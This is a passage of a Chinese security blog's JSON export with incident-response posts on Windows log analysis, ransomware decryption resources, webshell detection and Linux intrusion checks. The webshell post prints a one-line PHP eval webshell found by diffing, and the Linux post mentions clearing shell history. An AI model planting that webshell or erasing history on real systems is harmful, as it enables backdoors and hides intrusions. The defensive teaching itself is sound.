https://blog.csdn.net/weixin_42742658/article/details/112479848","categories":[{"name":"漏洞分析","slug":"漏洞分析","permalink":"https://wolke.cn/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"}],"tags":[{"name":"CVE","slug":"CVE","permalink":"https://wolke.cn/tags/CVE/"},{"name":"Drupal","slug":"Drupal","permalink":"https://wolke.cn/tags/Drupal/"}],"author":"w01ke"},{"title":"Windows日志分析","slug":"Windows日志分析","date":"2022-04-08T10:59:31.000Z","updated":"2022-04-08T11:01:38.383Z","comments":true,"path":"post/604d6f82.html","link":"","permalink":"https://wolke.cn/post/604d6f82.html","excerpt":"","text":"一、Windows事件日志简介Windows系统日志是记录系统中硬件、软件和系统问题的信息，同时还可以监视系统中发生的事件。用户可以通过它来检查错误发生的原因，或者寻找受到攻击时攻击者留下的痕迹。 Windows主要有以下三类日志记录系统事件：应用程序日志、系统日志和安全日志。 系统和应用程序日志存储着故障排除信息，对于系统管理员更为有用。 安全日志记录着事件审计信息，包括用户验证（登录、远程访问等）和特定用户在认证后对系统做了什么，对于调查人员而言，更有帮助。 1、系统日志记录操作系统组件产生的事件，主要包括驱动程序、系统组件和应用软件的崩溃以及数据丢失错误等。系统日志中记录的时间类型由Windows NT/2000操作系统预先定义。 默认位置： %SystemRoot%\\System32\\Winevt\\Logs\\System.evtx 2、应用程序日志包含由应用程序或系统程序记录的事件，主要记录程序运行方面的事件，例如数据库程序可以在应用程序日志中记录文件错误，程序开发人员可以自行决定监视哪些事件。如果某个应用程序出现崩溃情况，那么我们可以从程序事件日志中找到相应的记录，也许会有助于你解决问题。 默认位置：%SystemRoot%\\System32\\Winevt\\Logs\\Application.evtx 3、安全日志记录系统的安全审计事件，包含各种类型的登录日志、对象访问日志、进程追踪日志、特权使用、帐号管理、策略变更、系统事件。安全日志也是调查取证中最常用到的日志。默认设置下，安全性日志是关闭的，管理员可以使用组策略来启动安全性日志，或者在注册表中设置审核策略，以便当安全性日志满后使系统停止响应。 默认位置：%SystemRoot%\\System32\\Winevt\\Logs\\Security.evtx 二、审核策略与事件查看器Windows Server 2008 R2 系统的审核功能在默认状态下并没有启用 ，建议开启审核策略，若日后系统出现故障、安全事故则可以查看系统的日志文件，排除故障，追查入侵者的信息等。 PS：默认状态下，也会记录一些简单的日志，日志默认大小20M 设置1：开始 → 管理工具 → 本地安全策略 → 本地策略 → 审核策略，参考配置操作： 设置2：设置合理的日志属性，即日志最大大小、事件覆盖阀值等： 查看系统日志方法： 在“开始”菜单上，依次指向“所有程序”、“管理工具”，然后单击“事件查看器” 按 “Window+R“，输入 ”eventvwr.msc“ 也可以直接进入“事件查看器” 三、事件日志分析对于Windows事件日志分析，不同的EVENT ID代表了不同的意义，摘录一些常见的安全事件的说明： 事件ID 说明 4624 登录成功 4625 登录失败 4634 注销成功 4647 用户启动的注销 4672 使用超级用户（如管理员）进行登录 4720 创建用户 每个成功登录的事件都会标记一个登录类型，不同登录类型代表不同的方式： 登录类型 描述 说明 2 交互式登录（Interactive） 用户在本地进行登录。 3 网络（Network） 最常见的情况就是连接到共享文件夹或共享打印机时。 4 批处理（Batch） 通常表明某计划任务启动。 5 服务（Service） 每种服务都被配置在某个特定的用户账号下运行。 7 解锁（Unlock） 屏保解锁。 8 网络明文（NetworkCleartext） 登录的密码在网络上是通过明文传输的，如FTP。 9 新凭证（NewCredentials） 使用带/Netonly参数的RUNAS命令运行一个程序。 10 远程交互，（RemoteInteractive） 通过终端服务、远程桌面或远程协助访问计算机。 11 缓存交互（CachedInteractive） 以一个域用户登录而又没有域控制器可用 关于更多EVENT ID，详见微软官方网站上找到“Windows Vista 和 Windows Server 2008 中的安全事件的说明”。 原文链接 ：https://support.microsoft.com/zh-cn/help/977519/description-of-security-events-in-windows-7-and-in-windows-server-2008 案例1：利用eventlog事件来查看系统账号登录情况 在“开始”菜单上，依次指向“所有程序”、“管理工具”，然后单击“事件查看器”； 在事件查看器中，单击“安全”，查看安全日志； 在安全日志右侧操作中，点击“筛选当前日志”，输入事件ID进行筛选。4624 –登录成功4625 –登录失败4634 – 注销成功4647 – 用户启动的注销4672 – 使用超级用户（如管理员）进行登录 我们输入事件ID：4625进行日志筛选，发现事件ID：4625，事件数175904，即用户登录失败了175904次，那么这台服务器管理员账号可能遭遇了暴力猜解。 案例2：利用eventlog事件来查看计算机开关机的记录1、在“开始”菜单上，依次指向“所有程序”、“管理工具”，然后单击“事件查看器”； 2、在事件查看器中，单击“系统”，查看系统日志； 3、在系统日志右侧操作中，点击“筛选当前日志”，输入事件ID进行筛选。 其中事件ID 6006 ID6005、 ID 6009就表示不同状态的机器的情况（开关机）。6005 信息 EventLog 事件日志服务已启动。(开机)6006 信息 EventLog 事件日志服务已停止。(关机)6009 信息 EventLog 按ctrl、alt、delete键(非正常)关机 我们输入事件ID：6005-6006进行日志筛选，发现了两条在2018/7/6 17:53:51左右的记录，也就是我刚才对系统进行重启的时间。 四、日志分析工具1、Log ParserLog Parser（是微软公司出品的日志分析工具，它功能强大，使用简单，可以分析基于文本的日志文件、XML 文件、CSV（逗号分隔符）文件，以及操作系统的事件日志、注册表、文件系统、Active Directory。它可以像使用 SQL 语句一样查询分析这些数据，甚至可以把分析结果以各种图表的形式展现出来。 Log Parser 2.2下载地址：https://www.microsoft.com/en-us/download/details.aspx?id=24659 Log Parser 使用示例：https://mlichtenberg.wordpress.com/2011/02/03/log-parser-rocks-more-than-50-examples/ （1）基本查询结构Logparser.exe –i:EVT –o:DATAGRID &quot;SELECT * FROM c:\\xx.evtx&quot; （2）使用Log Parser分析日志① 查询登录成功的事件登录成功的所有事件LogParser.exe -i:EVT –o:DATAGRID &quot;SELECT * FROM c:\\Security.evtx where EventID=4624&quot;指定登录时间范围的事件：LogParser.exe -i:EVT –o:DATAGRID &quot;SELECT * FROM c:\\Security.evtx where TimeGenerated&gt;&#x27;2018-06-19 23:32:11&#x27; and TimeGenerated&lt;&#x27;2018-06-20 23:34:00&#x27; and EventID=4624&quot;提取登录成功的用户名和IP：LogParser.exe -i:EVT –o:DATAGRID &quot;SELECT EXTRACT_TOKEN(Message,13,&#x27; &#x27;) as EventType,TimeGenerated as LoginTime,EXTRACT_TOKEN(Strings,5,&#x27;|&#x27;) as Username,EXTRACT_TOKEN(Message,38,&#x27; &#x27;) as Loginip FROM c:\\Security.evtx where EventID=4624&quot; ② 查询登录失败的事件登录失败的所有事件：LogParser.exe -i:EVT –o:DATAGRID &quot;SELECT * FROM c:\\Security.evtx where EventID=4625&quot;提取登录失败用户名进行聚合统计：LogParser.exe -i:EVT &quot;SELECT EXTRACT_TOKEN(Message,13,&#x27; &#x27;) as EventType,EXTRACT_TOKEN(Message,19,&#x27; &#x27;) as user,count(EXTRACT_TOKEN(Message,19,&#x27; &#x27;)) as Times,EXTRACT_TOKEN(Message,39,&#x27; &#x27;) as Loginip FROM c:\\Security.evtx where EventID=4625 GROUP BY Message&quot; ④ 系统历史开关机记录：LogParser.exe -i:EVT –o:DATAGRID &quot;SELECT TimeGenerated,EventID,Message FROM c:\\System.evtx where EventID=6005 or EventID=6006&quot; 2、LogParser Lizard对于GUI环境的Log Parser Lizard，其特点是比较易于使用，甚至不需要记忆繁琐的命令，只需要做好设置，写好基本的SQL语句，就可以直观的得到结果。 下载地址：http://www.lizard-labs.com/log_parser_lizard.aspx 依赖包：Microsoft .NET Framework 4 .5，下载地址：https://www.microsoft.com/en-us/download/details.aspx?id=42642 查询最近用户登录情况： 3、Event Log ExplorerEvent Log Explorer是一款非常好用的Windows日志分析工具。可用于查看，监视和分析跟事件记录，包括安全，系统，应用程序和其他微软Windows 的记录被记载的事件，其强大的过滤功能可以快速的过滤出有价值的信息。 下载地址：https://event-log-explorer.en.softonic.com/ 五、参考链接： Windows日志分析 https://mp.weixin.qq.com/s/ige5UO8WTuOOO3yRw-LeqQ","categories":[{"name":"应急响应","slug":"应急响应","permalink":"https://wolke.cn/categories/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/"}],"tags":[{"name":"应急响应","slug":"应急响应","permalink":"https://wolke.cn/tags/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/"},{"name":"日志分析","slug":"日志分析","permalink":"https://wolke.cn/tags/%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/"}],"author":"w01ke"},{"title":"勒索病毒自救指南","slug":"勒索病毒自救指南","date":"2022-04-01T13:55:26.000Z","updated":"2022-04-01T14:04:12.393Z","comments":true,"path":"post/471da697.html","link":"","permalink":"https://wolke.cn/post/471da697.html","excerpt":"","text":"一、前言经常会有一些小伙伴问：中了勒索病毒，该怎么办，可以解密吗？ 第一次遇到勒索病毒是在早几年的时候，客户因网站访问异常，进而远程协助进行排查。登录服务器，在站点目录下发现所有的脚本文件及附件后缀名被篡改，每个文件夹下都有一个文件打开后显示勒索提示信息，这便是勒索病毒的特征。 出于职业习惯，我打包了部分加密文件样本和勒索病毒提示信息用于留档，就在今天，我又重新上传了样本，至今依然无法解密。 作为一个安全工程师，而非一个专业的病毒分析师，我们可以借助各大安全公司的能力，寻找勒索病毒的解密工具。 本文整理了一份勒索病毒自救指南，通过勒索病毒索引引擎查找勒索病毒相关信息，再通过各个安全公司提供的免费勒索软件解密工具解密。当然，能否解密全凭运气，so，平时还是勤打补丁多备份。 二、勒索病毒搜索引擎在勒索病毒搜索引擎输入病毒名、勒索邮箱、被加密后文件的后缀名，或直接上传被加密文件、勒索提示信息，即可可快速查找 到病毒详情和解密工具。 这些网站的解密能力还在持续更新中，是值得收藏的几个勒索病毒工具型网站。 【360】 勒索病毒搜索引擎，支持检索超过800种常见勒索病毒 官网：http://lesuobingdu.360.cn 【腾讯】 勒索病毒搜索引擎，支持检索超过 300 种常见勒索病毒 官网：https://guanjia.qq.com/pr/ls 【启明】VenusEye勒索病毒搜索引擎，超300种勒索病毒家族 官网：https://lesuo.venuseye.com.cn 【奇安信】勒索病毒搜索引擎 官网：https://lesuobingdu.qianxin.com 【深信服】勒索病毒搜索引擎 官网：https://edr.sangfor.com.cn/#/information/ransom_search 三、勒索软件解密工具集很多安全公司都提供了免费的勒索病毒解密工具下载，收集和整理相关下载地址，可以帮助我们了解和获取最新的勒索病毒解密工具。 【腾讯哈勃】勒索软件专杀工具 官网：https://habo.qq.com/tool 【金山毒霸】勒索病毒免疫工具 官网：http://www.duba.net/dbt/wannacry.html 【火绒】安全工具下载 官网：http://bbs.huorong.cn/forum-55-1.html 【瑞星】解密工具下载 官网：http://it.rising.com.cn/fanglesuo/index.html 【nomoreransom】勒索软件解密工具集 官网：https://www.nomoreransom.org/zh/index.html 【MalwareHunterTeam】勒索软件解密工具集 官网：https://id-ransomware.malwarehunterteam.com 【卡巴斯基】免费勒索解密器 官网：https://noransom.kaspersky.com 【Avast】免费勒索软件解密工具 官网：https://www.avast.com/zh-cn/ransomware-decryption-tools 【Emsisoft】免费勒索软件解密工具 官网：https://www.emsisoft.com/ransomware-decryption-tools/free-download 【GitHub 项目】勒索病毒解密工具收集汇总 官网：https://github.com/jiansiting/Decryption-Tools","categories":[{"name":"应急响应","slug":"应急响应","permalink":"https://wolke.cn/categories/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/"}],"tags":[{"name":"应急响应","slug":"应急响应","permalink":"https://wolke.cn/tags/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/"}],"author":"w01ke"},{"title":"如何发现隐藏的WebShell后门","slug":"如何发现隐藏的WebShell后门","date":"2022-04-01T13:22:46.000Z","updated":"2022-04-01T13:57:31.043Z","comments":true,"path":"post/5542d8c4.html","link":"","permalink":"https://wolke.cn/post/5542d8c4.html","excerpt":"","text":"一、前言如何在百万行代码里发现隐藏的后门？ 试想一下，如果你的网站被入侵，攻击者留下隐藏的后门，你真的都可以找出来吗？面对一个大中型的应用系统，数以百万级的代码行，是不可能做到每个文件每段代码进行手工检查的。 即使是一款拥有 99.9% 的 Webshell 检出率的检测引擎，依然可能存在 Webshell 绕过的情况。另外，像暗链、网页劫持、页面跳转等常见的黑帽 SEO 手法，也很难通过手动检测或工具检测全部识别出来。 最好的方式就是做文件完整性验证。通过与原始代码对比，可以快速发现文件是否被篡改以及被篡改的位置。当然，第一个前提是，你所在的团队已具备代码版本管理的能力，如果你是个人站长，相信你已经备份了原始代码。 本文将结合实际应用，介绍几种文件完整性验证方式，可以帮助你找出代码中所有隐藏的后门。 二、方法1、文件 MD5 校验下载D盾_Web查杀工具的时候，我们可以留意到下载的压缩包里，除了有一个 exe 可执行文件，还有一个文件 md5 值。这个是软件作者在发布软件时，通过 md5 算法计算出该 exe 文件的”特征值”。 下载地址：http://www.d99net.net/down/WebShellKill_V2.0.9.zip文件 MD5：29285decadbce3918a4f8429ec33df46 WebShellKill.exe 当用户下载软件时，可以使用相同的校验算法计算下载到 exe 文件的特征值，并与软件开发者发布的特征值比较。如果两个特征值相同，则认为下载到的 exe 文件是正确的。如果两个特征值不同，则认为下载到 exe 文件是被篡改过的。 那同理可得，我们可以将所有网站文件计算一次 hash 值保存，当出现应急情况时，重新计算一次 hash 值，并与上次保存的 hash 值进行对比，从而输出新创建的、修改过及删除的文件列表。 文件 hash 值计算： def md5sum(file): m = hashlib.md5() # 获取一个md5加密算法对象 if os.path.isfile(file): f = open(file,&#x27;rb&#x27;) # 因为hashlib是对二进制进行加密的，如果直接对字符串加密的话，会报错的。因此需要通过encode将字符串转码成二进制格式或者直接用二进制打开 for line in f: m.update(line) # 制定需要加密的字符串，这里就是把每一行都加密 f.close else: m.update(file) return (m.hexdigest()) # 返回加密后的16进制字符串 对文件进行哈希值重新计算，进行校验对比，测试效果： 如上图，在上传目录新增了一个 evil.php 文件，还有一个被篡改的文件是 low.php 。使用常见的编辑器 Notepad++ 进行对比，可以发现 low.php 文件里被插入了一句话 WebShell。 2、diff 命令在 Linux 中，我们经常使用 diff 命令来比较两个文本文件的差异。同样，我们可以通过一行命令快速找出两个项目文件的差异。 diff -c -a -r cms1 cms2 如下图所示，前三行列出了两个要对比的文件目录的差异，可以发现 low.php 文件被篡改过，篡改的内容是 @eval($_POST[&#39;g&#39;]); 备注：如果只是想查看两个文件是否不同又不想显示差异之处的话，可以加上 -q 选项。 3、版本控制工具版本控制工具，比如说 git，重新上传代码到 git，add+commit+push，然后打开项目，点击 commits，在历史提交版本里面，查看文件更改内容，很容易就可以发现代码被篡改的地方了。 另外，也可以通过 git diff 用来比较文件之间的不同。 4、文件对比工具关键词：代码对比工具，你会找到很多好用的工具，这里我们推荐两款效果还不错的工具，Beyond Compare 和 WinMerge。 （1）Beyond CompareBeyond Compare 是一套由 Scooter Software 推出的文件比较工具。主要用途是对比两个文件夹或者文件，并将差异以颜色标示，比较范围包括目录，文档内容等。 下载地址：http://www.scootersoftware.com/download.php 软件使用示例，通过文件夹比较，找出文件夹中的差异内容。 双击 Beyond Compare ，打开软件主页，选择文件夹比较。 在双边栏输入文件夹路径，点击显示差别，列出差异部分的内容，紫色部分为新增文件，红色部分为篡改文件。 双击具体文件，进入代码对比，找到代码差异部分。 （2）WinMergeWinMerge 是一款运行于 Windows 系统下的文件比较和合并工具，使用它可以非常方便地比较文件夹和文件，以易于理解的可视文本格式显示差异。 下载地址：https://winmerge.org/downloads/ 文件 – 打开，选择文件或文件夹，然后点击进行比较。 在同一个界面里，通过颜色和文本提示，显示文件夹内容差异。","categories":[{"name":"应急响应","slug":"应急响应","permalink":"https://wolke.cn/categories/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/"}],"tags":[{"name":"Web安全","slug":"Web安全","permalink":"https://wolke.cn/tags/Web%E5%AE%89%E5%85%A8/"},{"name":"应急响应","slug":"应急响应","permalink":"https://wolke.cn/tags/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/"}],"author":"w01ke"},{"title":"常见的WebShell查杀工具","slug":"常见的WebShell查杀工具","date":"2022-04-01T13:15:38.000Z","updated":"2022-04-01T13:57:31.052Z","comments":true,"path":"post/2812b919.html","link":"","permalink":"https://wolke.cn/post/2812b919.html","excerpt":"","text":"一、前言当网站服务器被入侵时，我们需要一款Webshell检测工具，来帮助我们发现webshell，进一步排查系统可能存在的安全漏洞。 本文推荐了10款 WebShell 检测工具，用于网站入侵排查。当然，目前市场上的很多主机安全产品也都提供这种 WebShell 检测能力，比如阿里云、青藤云、safedog 等，本文暂不讨论。 二、常见Webshell查杀工具1、D盾_Web查杀阿D出品，使用自行研发不分扩展名的代码分析引擎，能分析更为隐藏的 WebShell 后门行为。 兼容性：只提供 Windows 版本。 工具下载地址：http://www.d99net.net 2、百度 WEBDIR+下一代 WebShell 检测引擎，采用先进的动态监测技术，结合多种引擎零规则查杀。 兼容性：提供在线查杀木马，免费开放 API 支持批量检测。 在线查杀地址：https://scanner.baidu.com 3、河马专注 WebShell 查杀研究，拥有海量 WebShell 样本和自主查杀技术，采用传统特征+云端大数据双引擎的查杀技术。查杀速度快、精度高、误报低。 兼容性：支持 Windows、Linux，支持在线查杀。 官方网站：https://www.shellpub.com 4、Web Shell DetectorWeb Shell Detector 具有 WebShell 签名数据库，可帮助识别高达 99％ 的 WebShell。 兼容性：提供 PHP、Python 脚本，可跨平台，在线检测。 官方网站：http://www.shelldetector.com github项目地址：https://github.com/emposha/PHP-Shell-Detector 5、CloudWalker（牧云）一个可执行的命令行版本 Webshell 检测工具。目前，项目已停止更新。 兼容性：提供 Linux版本，Windows 暂不支持。 在线查杀 demo：https://webshellchop.chaitin.cn GitHub 项目地址：https://github.com/chaitin/cloudwalker 6、Sangfor WebShellKillSangfor WebShellKill (网站后门检测工具)是一款 Web 后门专杀工具，不仅支持 WebShell 的扫描，同时还支持暗链的扫描。是一款融合了多重检测引擎的查杀工具。能更精准地检测出WEB网站已知和未知的后门文件。 兼容性：支持 Windows、linux 工具下载地址：http://edr.sangfor.com.cn/backdoor_detection.html（已停止访问） 7、深度学习模型检测 PHP Webshell一个深度学习 PHP WebShell 查杀引擎 demo，提供在线样本检测。 在线查杀地址：http://webshell.cdxy.me 8、PHP Malware FinderPHP-malware-finder 是一款优秀的检测webshell和恶意软件混淆代码的工具 兼容性：提供Linux 版本，Windows 暂不支持。 GitHub 项目地址：https://github.com/jvoisin/php-malware-finder 9、findWebshell这个项目是一款基于 Python 开发的 WebShell 检查工具，可以根据特征码匹配检查任意类型的 WebShell 后门。 GitHub 项目地址：https://github.com/he1m4n6a/findWebshell 10、在线 WebShell 查杀工具在线查杀地址：http://tools.bugscaner.com/killwebshell","categories":[{"name":"应急响应","slug":"应急响应","permalink":"https://wolke.cn/categories/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/"}],"tags":[{"name":"Web安全","slug":"Web安全","permalink":"https://wolke.cn/tags/Web%E5%AE%89%E5%85%A8/"},{"name":"应急响应","slug":"应急响应","permalink":"https://wolke.cn/tags/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/"}],"author":"w01ke"},{"title":"Linux入侵排查","slug":"Linux入侵排查","date":"2022-03-31T11:08:33.000Z","updated":"2022-03-31T11:18:43.104Z","comments":true,"path":"post/af6fba30.html","link":"","permalink":"https://wolke.cn/post/af6fba30.html","excerpt":"","text":"一、前言当企业发生黑客入侵、系统崩溃或其它影响业务正常运行的安全事件时，急需第一时间进行处理，使企业的网络信息系统在最短时间内恢复正常工作，进一步查找入侵来源，还原入侵事故过程，同时给出解决方案与防范措施，为企业挽回或减少经济损失。 针对常见的攻击事件，结合工作中应急响应事件分析和解决的方法，总结了一些 Linux 服务器入侵排查的思路。 二、入侵排查思路1、账号安全（1）基本使用① 用户信息文件[root@VM-0-15-centos ~]# cat /etc/passwdroot:x:0:0:root:/root:/bin/bashaccount:password:UID:GID:GECOS:directory:shell用户名：密码：用户ID：组ID：用户说明：家目录：登陆之后的 shell注意：无密码只允许本机登陆，远程不允许登陆 ② 影子文件[root@VM-0-15-centos ~]# cat /etc/shadowroot:$6$oGs1PqhL2p3ZetrE$X7o7bzoouHQVSEmSgsYN5UD4.kMHx6qgbTqwNVC5oOAouXvcjQSt.Ft7ql1WpkopY0UV9ajBwUt1DpYxTCVvI/:16809:0:99999:7:::用户名：加密密码：密码最后一次修改日期：两次密码的修改时间间隔：密码有效期：密码修改到期到的警告天数：密码过期之后的宽限天数：账号失效时间：保留 ③ 常用命令who 查看当前登录用户（tty 本地登陆 pts 远程登录）w 查看系统信息，想知道某一时刻用户的行为uptime 查看登陆多久、多少用户，负载状态 （2）入侵排查① 查询特权用户特权用户(uid 为0)awk -F: &#x27;$3==0&#123;print $1&#125;&#x27; /etc/passwd将/etc/passwd文件内容以:为分割符，过滤出第3列（即uid）为0的第1列（用户名）的数据 ② 查询可以远程登录的帐号信息awk &#x27;/\\$1|\\$6/&#123;print $1&#125;&#x27; /etc/shadow/etc/shadow文件内容中，筛选出一行中包含$1或$6的的行数据 ③ 除root帐号外，其他帐号是否存在sudo权限除root帐号外，其他帐号是否存在sudo权限。如非管理需要，普通帐号应删除sudo权限 more /etc/sudoers | grep -v &quot;^#\\|^$&quot; | grep &quot;ALL=(ALL)&quot;grep -v 反转查找，输出除匹配项之外的所有行，这里的匹配项是#或$开头的，主要是为了去除掉root ④ 禁用或删除多余及可疑的帐号usermod -L user 禁用帐号，帐号无法登录，/etc/shadow 第二栏为 ! 开头userdel user 删除 user 用户userdel -r user 将删除 user 用户，并且将 /home 目录下的 user 目录一并删除 2、历史命令（1）基本使用① root用户的历史命令historycat /root/.bash_history ② 查看.bash_history文件查看帐号执行过的系统命令打开 /home 各帐号目录下的 .bash_history，查看普通帐号执行的历史命令。 cat /root/username/.bash_history 【保存1万条命令】 sed -i &#x27;s/^HISTSIZE=1000/HISTSIZE=10000/g&#x27; /etc/profile利用 sed 把HISTSIZE=1000替换成HISTSIZE=10000 【在/etc/profile的文件尾部添加如下行数配置信息】 ######jiagu history xianshi#########USER_IP=`who -u am i 2&gt;/dev/null | awk &#x27;&#123;print $NF&#125;&#x27; | sed -e &#x27;s/[()]//g&#x27;`if [ &quot;$USER_IP&quot; = &quot;&quot; ]thenUSER_IP=`hostname`fiexport HISTTIMEFORMAT=&quot;%F %T $USER_IP `whoami` &quot;shopt -s histappendexport PROMPT_COMMAND=&quot;history -a&quot;######### jiagu history xianshi ########## 【source /etc/profile 让配置生效】 [root@VM-0-15-centos ~]# source /etc/profile[root@VM-0-15-centos ~]# history生成效果： 1 2018-07-10 19:45:39 192.168.204.1 root source /etc/profile 历史操作命令的清除：history -c 但此命令并不会清除保存在文件中的记录，因此需要手动删除 .bash_profile 文件中的记录。 （2）入侵排查进入用户目录下，导出历史命令。 cat .bash_history &gt;&gt; history.txt 3、检查异常端口使用 netstat 网络连接命令，分析可疑端口、IP、PID netstat -antlp | more 查看下 pid 所对应的进程文件路径 ls -l /proc/$PID/exe或file /proc/$PID/exe（$PID 为对应的 pid 号） 4、检查异常进程使用 ps 命令，分析进程 ps aux | grep pida 显示现行终端机下的所有程序，包括其他用户的程序。u 以用户为主的格式来显示程序状况。x 显示所有程序，不以终端机来区分。 5、检查开机启动项（1）基本使用系统运行级别示意图： 运行级别 含义 0 关机 1 单用户模式，可以想象为windows的安全模式，主要用于系统修复 2 不完全的命令行模式，不含NFS服务 3 完全的命令行模式，就是标准字符界面 4 系统保留 5 图形模式 6 重启动 查看运行级别命令 runlevel 系统默认允许级别 vi /etc/inittabid=3：initdefault #系统开机后直接进入哪个运行级别 开机启动配置文件 /etc/rc.local/etc/rc.d/rc[0~6].d 例子：当我们需要开机启动自己的脚本时，只需要将可执行脚本丢在 /etc/init.d 目录下，然后在 /etc/rc.d/rc*.d 文件中建立软链接即可。 注：此中的 * 代表 0,1,2,3,4,5,6 这七个等级 root@localhost ~]# ln -s /etc/init.d/sshd /etc/rc.d/rc3.d/S100ssh 此处sshd是具体服务的脚本文件，S100ssh是其软链接，S开头代表加载时自启动；如果是K开头的脚本文件，代表运行级别加载时需要关闭的。 （2）入侵排查启动项文件： more /etc/rc.local/etc/rc.d/rc[0~6].dls -l /etc/rc.d/rc3.d/ 6、检查定时任务（1）基本使用① 利用 crontab 创建计划任务基本命令 crontab -l 列出某个用户cron服务的详细内容Tips：默认编写的crontab文件会保存在 (/var/spool/cron/用户名 例如: /var/spool/cron/rootcrontab -r 删除每个用户cront任务(谨慎：删除所有的计划任务)crontab -e 使用编辑器编辑当前的crontab文件 如：*/1 * * * * echo &quot;hello world&quot; &gt;&gt; /tmp/test.txt 每分钟写入文件 ② 利用 anacron 命令实现异步定时任务调度使用案例 每天运行 /home/backup.sh 脚本：vi /etc/anacrontab @daily 10 example.daily /bin/bash /home/backup.sh当机器在 backup.sh 期望被运行时是关机的，anacron会在机器开机十分钟之后运行它，而不用再等待 7天。 （2）入侵排查重点关注以下目录中是否存在恶意脚本 /var/spool/cron/* /etc/crontab/etc/cron.d/*/etc/cron.daily/* /etc/cron.hourly/* /etc/cron.monthly/*/etc/cron.weekly//etc/anacrontab/var/spool/anacron/* 小技巧： more /etc/cron.daily/* 查看目录下所有文件 7、检查服务（1）服务自启动第一种修改方法： chkconfig [--level 运行级别] [独立服务名] [on|off]chkconfig –level 2345 httpd on 开启自启动chkconfig httpd on （默认level是2345） 第二种修改方法： 修改 /etc/re.d/rc.local 文件 加入 /etc/init.d/httpd start 第三种修改方法：使用 ntsysv 命令管理自启动，可以管理独立服务和 xinetd 服务。 （2）入侵排查① 查询已安装的服务RPM 包安装的服务 chkconfig --list 查看服务自启动状态，可以看到所有的RPM包安装的服务ps aux | grep crond 查看当前服务系统在3与5级别下的启动项 中文环境chkconfig --list | grep &quot;3:启用\\|5:启用&quot;英文环境chkconfig --list | grep &quot;3:on\\|5:on&quot; 源码包安装的服务 查看服务安装位置 ，一般是在/user/local/service httpd start搜索/etc/rc.d/init.d/ 查看是否存在 8、检查异常文件 查看敏感目录，如/tmp目录下的文件，同时注意隐藏文件夹，以“..”为名的文件夹具有隐藏属性 得到发现WEBSHELL、远控木马的创建时间，如何找出同一时间范围内创建的文件？&emsp;&emsp;可以使用find命令来查找，如 find /opt -iname &quot;*&quot; -atime 1 -type f 找出 /opt 下一天前访问过的文件 针对可疑文件可以使用 stat 进行创建修改时间。 9、检查系统日志日志默认存放位置：/var/log/ 查看日志配置情况：more /etc/rsyslog.conf 日志文件 说明 /var/log/cron 记录了系统定时任务相关的日志 /var/log/cups 记录打印信息的日志 /var/log/dmesg 记录了系统在开机时内核自检的信息，也可以使用dmesg命令直接查看内核自检信息 /var/log/mailog 记录邮件信息 /var/log/message 记录系统重要信息的日志。这个日志文件中会记录Linux系统的绝大多数重要信息，如果系统出现问题时，首先要检查的就应该是这个日志文件 /var/log/btmp 记录错误登录日志，这个文件是二进制文件，不能直接vi查看，而要使用lastb命令查看 /var/log/lastlog 记录系统中所有用户最后一次登录时间的日志，这个文件是二进制文件，不能直接vi，而要使用lastlog命令查看 /var/log/wtmp 永久记录所有用户的登录、注销信息，同时记录系统的启动、重启、关机事件。同样这个文件也是一个二进制文件，不能直接vi，而需要使用last命令来查看 /var/log/utmp 记录当前已经登录的用户信息，这个文件会随着用户的登录和注销不断变化，只记录当前登录用户的信息。同样这个文件不能直接vi，而要使用w,who,users等命令来查询 /var/log/secure 记录验证和授权方面的信息，只要涉及账号和密码的程序都会记录，比如SSH登录，su切换用户，sudo授权，甚至添加用户和修改用户密码都会记录在这个日志文件中 日志分析技巧： 1、定位有多少IP在爆破主机的root帐号： grep &quot;Failed password for root&quot; /var/log/secure | awk &#x27;&#123;print $11&#125;&#x27; | sort | uniq -c | sort -nr | more定位有哪些IP在爆破：grep &quot;Failed password&quot; /var/log/secure|grep -E -o &quot;(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)&quot;|uniq -c爆破用户名字典是什么？grep &quot;Failed password&quot; /var/log/secure|perl -e &#x27;while($_=&lt;&gt;)&#123; /for(.*?) from/; print &quot;$1\\n&quot;;&#125;&#x27;|uniq -c|sort -nr 2、登录成功的IP有哪些： grep &quot;Accepted &quot; /var/log/secure | awk &#x27;&#123;print $11&#125;&#x27; | sort | uniq -c | sort -nr | more登录成功的日期、用户名、IP：grep &quot;Accepted &quot; /var/log/secure | awk &#x27;&#123;print $1,$2,$3,$9,$11&#125;&#x27; 3、增加一个用户kali日志：Jul 10 00:12:15 localhost useradd[2382]: new group: name=kali, GID=1001Jul 10 00:12:15 localhost useradd[2382]: new user: name=kali, UID=1001, GID=1001, home=/home/kali, shell=/bin/bashJul 10 00:12:58 localhost passwd: pam_unix(passwd:chauthtok): password changed for kali#grep &quot;useradd&quot; /var/log/secure 4、删除用户kali日志：Jul 10 00:14:17 localhost userdel[2393]: delete user &#x27;kali&#x27;Jul 10 00:14:17 localhost userdel[2393]: removed group &#x27;kali&#x27; owned by &#x27;kali&#x27;Jul 10 00:14:17 localhost userdel[2393]: removed shadow group &#x27;kali&#x27; owned by &#x27;kali&#x27;# grep &quot;userdel&quot; /var/log/secure5、su切换用户：Jul 10 00:38:13 localhost su: pam_unix(su-l:session): session opened for user good by root(uid=0)sudo授权执行:sudo -lJul 10 00:43:09 localhost sudo: good : TTY=pts/4 ; PWD=/home/good ; USER=root ; COMMAND=/sbin/shutdown -r now 三、工具篇1、Rootkit查杀 chkrootkit：http://www.chkrootkit.org 使用方法：wget ftp://ftp.pangeia.com.br/pub/seg/pac/chkrootkit.tar.gztar zxvf chkrootkit.tar.gzcd chkrootkit-0.52make sense#编译完成没有报错的话执行检查./chkrootkit rkhunter：http://rkhunter.sourceforge.net 使用方法：Wget 